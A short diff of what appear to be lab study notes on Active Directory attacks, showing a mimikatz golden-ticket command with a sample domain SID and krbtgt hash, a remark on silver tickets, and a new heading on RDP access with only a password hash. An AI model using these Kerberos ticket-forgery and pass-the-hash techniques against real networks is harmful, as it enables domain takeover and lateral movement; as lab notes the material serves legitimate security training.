@@ -57,3 +57,7 @@ Something like:
 Golden ticket: `mimikatz kerberos::golden /user:dfm /domain:testlab.local /sid:S-1-5-21-883232822-274137685-4173207997 /krbtgt:b3c87251042db43980ef7607733fda72 /ptt`  (via Cobal strike, see pdf)
 
 Silver ticket is similar just for a specific service.
+
+
+## Connect via RDP if we only have the hash 
+see lab task "Lateral Movement/Abusing Domain Admin"
